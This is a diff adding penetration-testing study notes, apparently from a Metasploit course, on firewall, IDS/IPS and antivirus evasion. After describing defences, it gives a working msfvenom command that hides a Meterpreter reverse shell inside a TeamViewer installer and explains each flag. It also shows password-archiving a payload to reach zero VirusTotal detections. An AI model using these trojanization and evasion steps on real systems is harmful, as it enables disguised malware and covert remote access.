@@ -865,3 +865,117 @@ run
 
 Having these results in front of us, we can easily pick one of them to test out. If the one we chose is not valid after all, move on to the next. Not all checks are 100% accurate, and not all variables are the same. Going down the list, `bypassauc_eventvwr` fails due to the IIS user not being a part of the administrator's group, which is the default and expected. The second option, `ms10_015_kitrap0d`, does the trick.
 # Firewall and IDS/IPS Evasion
+To better learn how we can efficiently and quietly attack a target, we first need to understand better how that target is defended. We are introduced to two new terms:
+
+- Endpoint protection
+- Perimeter protection
+## Endpoint Protection
+
+`Endpoint protection` refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network's De-Militarized Zone (`DMZ`).
+
+Endpoint protection usually comes in the form of software packs which include `Antivirus Protection`, `Antimalware Protection` (this includes bloatware, spyware, adware, scareware, ransomware), `Firewall`, and `Anti-DDOS` all in one, under the same software package. We are better familiarized with this form than the latter, as most of us are running endpoint protection software on our PCs at home or the workstations at our workplace. Avast, Nod32, Malwarebytes, and BitDefender are just some current names.
+#### Perimeter Protection
+
+`Perimeter protection` usually comes in physical or virtualized devices on the network perimeter edge. These `edge devices` themselves provide access `inside` of the network from the `outside`, in other terms, from `public` to `private`.
+
+Between these two zones, on some occasions, we will also find a third one, called the De-Militarized Zone (`DMZ`), which was mentioned previously. This is a `lower-security policy level` zone than the `inside networks'` one, but with a higher `trust level` than the `outside zone`, which is the vast Internet. This is the virtual space where public-facing servers are housed, which push and pull data for public clients from the Internet but are also managed from the inside and updated with patches, information, and other data to keep the served information up to date and satisfy the customers of the servers.
+## Security Policies
+They are essentially a list of `allow` and `deny` statements that dictate how traffic or files can exist within a network boundary. Multiple lists can act upon multiple network parts, allowing for flexibility within a configuration. These lists can also target different features of the network and hosts, depending on where they reside:
+
+- Network Traffic Policies
+- Application Policies
+- User Access Control Policies
+- File Management Policies
+- DDoS Protection Policies
+- Others
+
+There are multiple ways to match an event or object with a security policy entry:
+
+|**Security Policy**|**Description**|
+|---|---|
+|`Signature-based Detection`|The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. Any 100% match against these signatures will generate alarms.|
+|`Heuristic / Statistical Anomaly Detection`|Behavioral comparison against an established baseline included modus-operandi signatures for known APTs (Advanced Persistent Threats). The baseline will identify the norm for the network and what protocols are commonly used. Any deviation from the maximum threshold will generate alarms.|
+|`Stateful Protocol Analysis Detection`|Recognizing the divergence of protocols stated by event comparison using pre-built profiles of generally accepted definitions of non-malicious activity.|
+|`Live-monitoring and Alerting (SOC-based)`|A team of analysts in a dedicated, in-house, or leased SOC (Security Operations Center) use live-feed software to monitor network activity and intermediate alarming systems for any potential threats, either deciding themselves if the threat should be actioned upon or letting the automated mechanisms take action|
+## Evasion Techniques
+
+Most host-based anti-virus software nowadays relies mainly on `Signature-based Detection` to identify aspects of malicious code present in a software sample. These signatures are placed inside the Antivirus Engine, where they are subsequently used to scan storage space and running processes for any matches. When a piece of unknown software lands on a partition and is matched by the Antivirus software, most Anti-viruses quarantine the malicious program and kill the running process.
+
+How do we circumvent all this heat? We play along with it. The examples shown in the `Encoders` section show that simply encoding payloads using different encoding schemes with multiple iterations is not enough for all AV products. Moreover, merely establishing a channel of communication between the attacker and the victim can raise some alarms with the current capabilities of IDS/IPS products out there.
+
+Take a look at the snippet below to understand how msfvenom can embed payloads into any executable file:
+
+```shell
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
+```
+
+- `windows/x86/meterpreter_reverse_tcp`: the payload — a **stageless** (note the underscore, not slash) 32-bit Windows Meterpreter reverse shell
+- `LHOST=10.10.14.2` / `LPORT=8080`: your listener IP and port, where the payload will call back to
+- `-k`: **keep** — injects the payload as a separate thread inside the legitimate executable, so the original program (TeamViewer installer) still runs normally alongside the malicious code. This is what makes the trojan convincing — the victim sees TeamViewer install correctly, unaware a shell also fired in the background
+- `-x ~/Downloads/TeamViewer_Setup.exe`: the **template** — the legitimate executable you're embedding the payload into (trojanizing)
+- `-e x86/shikata_ga_nai`: encoder — here it's used mainly to slightly obfuscate the payload signature and increase chances of not being flagged by basic static AV signatures (though modern AV/EDR will likely still catch it, as discussed earlier)
+- `-a x86 --platform windows`: architecture and target platform — must match the template's architecture (a 32-bit installer needs a 32-bit payload)
+- `-o ~/Desktop/TeamViewer_Setup.exe`: output file — same filename as the template, to keep the disguise
+- `-i 5`: **iterations** — encodes the payload 5 times in a row (5 passes through the encoder), trying to further evade signature-based detection
+
+**What this does overall**: takes a real TeamViewer installer, embeds a reverse shell inside it as a hidden thread, encodes/obfuscates it 5 times, and outputs a trojanized installer that looks and behaves like the real thing to the victim — while silently phoning home to you on execution. Classic social-engineering delivery vector (the victim has to be tricked into running it).
+## Archives
+#### Generating Payload
+
+```shell
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
+```
+
+If we use this payload, the file will trigger alerts. In VirusTotal, it will be noted as malicious.
+
+Now, try archiving it two times, passwording both archives upon creation, and removing the `.rar`/`.zip`/`.7z` extension from their names. For this purpose, we can install the [RAR utility](https://www.rarlab.com/download.htm) from RARLabs, which works precisely like WinRAR on Windows.
+#### Archiving the Payload
+
+```shell
+wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
+tar -xzvf rarlinux-x64-612.tar.gz && cd rar
+rar a ~/test.rar -p ~/test.js
+
+Enter password (will not be echoed): ******
+Reenter password: ******
+
+RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
+Trial version             Type 'rar -?' for help
+Evaluation copy. Please register.
+
+Creating archive test.rar
+Adding    test.js                                                     OK
+Done
+```
+#### Removing the .RAR Extension
+
+```shell
+mv test.rar test
+```
+
+The test2 file is the final .rar archive with the extension (.rar) deleted from the name. After that, we can proceed to upload it on VirusTotal for another check.
+
+```shell
+msf-virustotal -k <API key> -f test2
+```
+
+>[!success] Here we have 0/89 reports in virustotal
+
+## Packers
+
+The term `Packer` refers to the result of an `executable compression` process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts.
+
+A list of popular packer software:
+
+|Packer/Protector 1|Packer/Protector 2|Packer/Protector 3|
+|---|---|---|
+|UPX packer|The Enigma Protector|MPRESS|
+|Alternate EXE Packer|ExeStealth|Morphine|
+|MEW|Themida||
+## Exploit Coding
+
+When coding our exploit or porting a pre-existing one over to the Framework, it is good to ensure that the exploit code is not easily identifiable by security measures implemented on the target system.
+
+For example, a typical `Buffer Overflow` exploit might be easily distinguished from regular traffic traveling over the network due to its hexadecimal buffer patterns. IDS / IPS placements can check the traffic towards the target machine and notice specific overused patterns for exploiting code.
+
+When assembling our exploit code, randomization can help add some variation to those patterns, which will break the IPS / IDS database signatures for well-known exploit buffers. This can be done by inputting an `Offset` switch inside the code for the msfconsole module:
